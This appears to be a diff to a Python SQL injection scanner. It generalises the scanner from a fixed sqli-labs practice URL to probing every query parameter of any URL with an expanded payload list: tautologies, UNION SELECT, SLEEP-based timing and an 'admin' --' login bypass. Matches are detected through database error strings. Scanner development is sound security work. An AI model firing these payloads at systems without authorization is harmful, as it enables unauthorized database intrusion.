@@ -3,9 +3,10 @@ import logging
 import sys
 import os
 import time
+import re
 import json
 from bs4 import BeautifulSoup
-from urllib.parse import urlparse,parse_qs,urljoin
+from urllib.parse import urlparse,parse_qs,urljoin,urlunparse, urlencode
 
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 
@@ -160,20 +161,29 @@ class sampilescanner:
     def check_sql_injection(self, url_input):
         """
         SQL注入扫描
-    支持单个URL字符串或URL列表
-    
-    Args:
-        url_input: 单个URL字符串 或 URL列表
-    
-    Returns:
-        list: 发现的漏洞列表
-        """ 
-    # SQL注入测试载荷
+        支持单个URL字符串或URL列表
+
+        Args:
+            url_input: 单个URL字符串 或 URL列表
+
+        Returns:
+            list: 发现的漏洞列表
+        """
+        # SQL注入测试载荷
         testpayloads = [
             "'",
             "\"",
             "' OR '1'='1",
             "\" OR \"1\"=\"1",
+            "' OR '1'='1' --",
+            "' OR 1=1 --",
+            "' UNION SELECT NULL --",
+            "1' AND SLEEP(5) --",
+            "1' OR '1'='1",
+            "-1' UNION SELECT 1,2,3 --",
+            "admin' --",
+            "1' ORDER BY 1 --",
+            "1' AND 1=2 UNION SELECT 1,2,3 --"
         ]
 
         # SQL错误指示器（全部小写以便比较）
@@ -184,10 +194,21 @@ class sampilescanner:
             "mysql_fetch",
             "syntax error",
             "mysql_num_rows",
-            "unclosed quotation mark after the character string",
+            "unclosed quotation mark",
             "quoted string not properly terminated",
-            "welcome",
-            "dhakkan"
+            "mysql error",
+            "sql server",
+            "ora-",
+            "postgresql",
+            "sqlite",
+            "odbc",
+            "jdbc",
+            "pdo",
+            "sql command",
+            "division by zero",
+            "invalid query",
+            "unknown column",
+            "table doesn't exist"
         ]
 
         vulnerabilities = []
@@ -209,86 +230,273 @@ class sampilescanner:
             
             print(f"\n开始测试URL: {url}")
 
-            # 对当前URL测试所有payload
-            for payload in testpayloads:
-                try:
-                    # 构建测试 URL（保证 base 有结尾斜杠再 join）
-                    base = url if url.endswith('/') else url + '/'
-                    test_url = urljoin(base, 'sqli-labs-master/Less-5/')
-                    params = {'id': f"1{payload}"}
+            try:
+                # 解析URL
+                parsed_url = urlparse(url)
+                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
 
-                    print(f"  测试payload: {payload}")
-                    print(f"  请求URL: {test_url}")
-                    print(f"  参数: {params}")
+                # 提取查询参数
+                query_params = parse_qs(parsed_url.query)
 
-                    if test_url:
-                        request_info={
-                            'method' : 'GET',
-                            'url':test_url,
-                            'headers':{},
-                            'params' : params
-                        }
-                    response=self.send_controlled_request(request_info)
+                # 如果没有查询参数，使用默认参数'id'
+                if not query_params:
+                    print(f"URL中没有查询参数，使用默认参数'id'")
+                    param_to_test = {'id': ['1']}
+                    params_to_test = [('id', '1')]
+                else:
+                    param_to_test = query_params
+                    params_to_test = []
+                    for key, values in query_params.items():
+                        if values:
+                            params_to_test.append((key, values[0]))
+
+                print(f"  基础URL: {base_url}")
+                print(f"  发现参数: {list(param_to_test.keys())}")
+
+                # 对当前URL测试所有payload
+                for payload in testpayloads:
+                    try:
+                        # 为每个参数创建测试URL
+                        for param_name, original_value in params_to_test:
+                            # 复制原始参数
+                            test_params = param_to_test.copy()
+
+                            # 对当前测试参数添加payload
+                            if param_name in test_params:
+                                # 保留原始值，加上payload
+                                test_value = f"{original_value}{payload}"
+                                test_params[param_name] = [test_value]
+
+                            # 构建查询字符串
+                            query_string = ""
+                            for key, values in test_params.items():
+                                for value in values:
+                                    if query_string:
+                                        query_string += "&"
+                                    query_string += f"{key}={value}"
+
+                            # 构建完整测试URL
+                            test_url = f"{base_url}?{query_string}"
+
+                            print(f"  测试payload: {payload}")
+                            print(f"  测试参数: {param_name}")
+                            print(f"  请求URL: {test_url}")
+
+                            # 准备请求信息
+                            request_info = {
+                                'method': 'GET',
+                                'url': test_url,
+                                'headers': {},
+                                'params': {}  # 参数已经在URL中，不需要单独传
+                            }
+
+                            # 发送请求
+                            response = self.send_controlled_request(request_info)
+
+                            if response is None:
+                                if hasattr(self.logger, 'error'):
+                                    self.logger.error(f"请求失败，响应为None: {test_url}")
+                                else:
+                                    print(f"请求失败，响应为None: {test_url}")
+                                continue
+                            
+                            # 检查解析的内容是否存在
+                            if 'parsed' not in response:
+                                error_msg = f"响应中没有parsed字段: {test_url}"
+                                if hasattr(self.logger, 'error'):
+                                    self.logger.error(error_msg)
+                                else:
+                                    print(error_msg)
+                                continue
+                            
+                            # 获取响应体
+                            body = str(response['parsed']['parsed_content'])
+
+                            # 检查是否有SQL错误指示器
+                            found_error = False
+                            body_lower = body.lower()
+
+                            for error in error_indicators:
+                                if error in body_lower:
+                                    vulnerabilities.append({
+                                        "url": url,  # 原始URL
+                                        "type": "SQL Injection",
+                                        "payload": payload,
+                                        "parameter": param_name,
+                                        "original_value": original_value,
+                                        "confidence": "低",
+                                        "tested_url": test_url,
+                                        "error_indicator": error,
+                                        "response_code": response['response']['status_code'],
+                                        "method": "GET"
+                                    })
+                                    found_error = True
+                                    print(f"  发现SQL注入漏洞！参数: {param_name}, 错误指示: {error[:50]}...")
+                                    break
+                                
+                            if not found_error:
+                                # 也可以检查其他SQL注入特征
+                                # 1. 检查响应时间延迟（如果有时间戳可以计算）
+                                # 2. 检查布尔盲注的特征
+                                # 3. 检查联合查询的特征
+
+                                # 简单的布尔盲注检测：检查响应长度变化
+                                # 这里可以添加更复杂的逻辑
+
+                                # 暂时标记为未发现
+                                print(f"  未发现漏洞 (参数: {param_name})")
+
+                    except requests.exceptions.Timeout:
+                        print(f"  请求超时: {url}")
+                        continue
+                    except requests.exceptions.RequestException as e:
+                        print(f"  请求错误: {e}")
+                        continue
+                    except Exception as e:
+                        print(f"  其他错误: {e}")
+                        continue
                     
-                    if response is None:
-                    # 修复logger调用 - 根据你的实际logger结构调整
-                        if hasattr(self.logger, 'error'):
-                            self.logger.error(f"请求失败，响应为None: {url}")                        
-                        else:
-                            print(f"请求失败，响应为None: {url}")
-                        continue
-                
-                    # 检查解析的内容是否存在
-                    if 'parsed' not in response:
-                        error_msg = f"响应中没有parsed字段: {url}"
-                        if hasattr(self.logger, 'error'):
-                            self.logger.error(error_msg)
-                        else:
-                            print(error_msg)
-                        continue
-                    body=str(response['parsed']['parsed_content'])
-                    #print(body)
-
-                    # response = self.session.get(test_url, params=params, timeout=5)#修改成包，利用受控制的请求发包
-                    # body = response.text.lower()
-                    # print(str(body))
-                    # print("---------------------------------")
-                    # print(body)
-                    # 检查是否有SQL错误指示器
-                    found_error = False
-                    for error in error_indicators:
-                        if error in str(body).lower():
-                            vulnerabilities.append({
-                                "url": url,  # 原始URL
-                                "type": "SQL Injection",
-                                "payload": payload,
-                                "confidence": "低",
-                                "tested_url": test_url,
-                                "params": params,
-                                "error_indicator": error,
-                                "response_code": response['response']['status_code']
-                            })
-                            found_error = True
-                            print(f"  发现SQL注入漏洞！错误指示: {error}")
-                            break
-                        
-                    if not found_error:
-                        print(f"  未发现漏洞")
-
-                except requests.exceptions.Timeout:
-                    print(f"  请求超时: {url}")
-                    continue
-                except requests.exceptions.RequestException as e:
-                    print(f"  请求错误: {e}")
-                    continue
-                except Exception as e:
-                    print(f"  其他错误: {e}")
-                    continue
-                
+            except Exception as e:
+                print(f"解析URL时出错: {e}")
+                continue
+            
         # 统计结果
         print(f"\n扫描完成！共发现 {len(vulnerabilities)} 个SQL注入漏洞")
         scan_results=self.results
         return vulnerabilities,scan_results
+
+    # def check_sql_injection(self, url_input):
+    #     """
+    #     SQL注入扫描
+    # 支持单个URL字符串或URL列表
+    
+    # Args:
+    #     url_input: 单个URL字符串 或 URL列表
+    
+    # Returns:
+    #     list: 发现的漏洞列表
+    #     """ 
+    # # SQL注入测试载荷
+    #     testpayloads = [
+    #         "'",
+    #         "\"",
+    #         "' OR '1'='1",
+    #         "\" OR \"1\"=\"1",
+    #     ]
+
+    #     # SQL错误指示器（全部小写以便比较）
+    #     error_indicators = [
+    #         "you have an error in your sql syntax",
+    #         "warning: mysql",
+    #         "sql syntax",
+    #         "mysql_fetch",
+    #         "syntax error",
+    #         "mysql_num_rows",
+    #         "unclosed quotation mark after the character string",
+    #         "quoted string not properly terminated",
+    #         "welcome",
+    #         "dhakkan"
+    #     ]
+
+    #     vulnerabilities = []
+
+    #     # 统一处理输入：将单个URL转换为列表
+    #     if isinstance(url_input, str):
+    #         urls = [url_input]
+    #     elif isinstance(url_input, list):
+    #         urls = url_input
+    #     else:
+    #         raise TypeError(f"url_input 必须是字符串或列表，但得到 {type(url_input)}")
+
+    #     # 对每个URL进行测试
+    #     for url in urls:
+    #         # 确保URL是字符串
+    #         if not isinstance(url, str):
+    #             print(f"跳过非字符串URL: {url}")
+    #             continue
+            
+    #         print(f"\n开始测试URL: {url}")
+
+    #         # 对当前URL测试所有payload
+    #         for payload in testpayloads:
+    #             try:
+    #                 # 构建测试 URL（保证 base 有结尾斜杠再 join）
+    #                 base = url if url.endswith('/') else url + '/'
+    #                 test_url = urljoin(base, 'sqli-labs-master/Less-5/')
+    #                 params = {'id': f"1{payload}"}
+
+    #                 print(f"  测试payload: {payload}")
+    #                 print(f"  请求URL: {test_url}")
+    #                 print(f"  参数: {params}")
+
+    #                 if test_url:
+    #                     request_info={
+    #                         'method' : 'GET',
+    #                         'url':test_url,
+    #                         'headers':{},
+    #                         'params' : params
+    #                     }
+    #                 response=self.send_controlled_request(request_info)
+                    
+    #                 if response is None:
+    #                 # 修复logger调用 - 根据你的实际logger结构调整
+    #                     if hasattr(self.logger, 'error'):
+    #                         self.logger.error(f"请求失败，响应为None: {url}")                        
+    #                     else:
+    #                         print(f"请求失败，响应为None: {url}")
+    #                     continue
+                
+    #                 # 检查解析的内容是否存在
+    #                 if 'parsed' not in response:
+    #                     error_msg = f"响应中没有parsed字段: {url}"
+    #                     if hasattr(self.logger, 'error'):
+    #                         self.logger.error(error_msg)
+    #                     else:
+    #                         print(error_msg)
+    #                     continue
+    #                 body=str(response['parsed']['parsed_content'])
+    #                 #print(body)
+
+    #                 # response = self.session.get(test_url, params=params, timeout=5)#修改成包，利用受控制的请求发包
+    #                 # body = response.text.lower()
+    #                 # print(str(body))
+    #                 # print("---------------------------------")
+    #                 # print(body)
+    #                 # 检查是否有SQL错误指示器
+    #                 found_error = False
+    #                 for error in error_indicators:
+    #                     if error in str(body).lower():
+    #                         vulnerabilities.append({
+    #                             "url": url,  # 原始URL
+    #                             "type": "SQL Injection",
+    #                             "payload": payload,
+    #                             "confidence": "低",
+    #                             "tested_url": test_url,
+    #                             "params": params,
+    #                             "error_indicator": error,
+    #                             "response_code": response['response']['status_code']
+    #                         })
+    #                         found_error = True
+    #                         print(f"  发现SQL注入漏洞！错误指示: {error}")
+    #                         break
+                        
+    #                 if not found_error:
+    #                     print(f"  未发现漏洞")
+
+    #             except requests.exceptions.Timeout:
+    #                 print(f"  请求超时: {url}")
+    #                 continue
+    #             except requests.exceptions.RequestException as e:
+    #                 print(f"  请求错误: {e}")
+    #                 continue
+    #             except Exception as e:
+    #                 print(f"  其他错误: {e}")
+    #                 continue
+                
+    #     # 统计结果
+    #     print(f"\n扫描完成！共发现 {len(vulnerabilities)} 个SQL注入漏洞")
+    #     scan_results=self.results
+    #     return vulnerabilities,scan_results
 
     def _extract_parameters(self, url):
         """从URL中提取参数"""
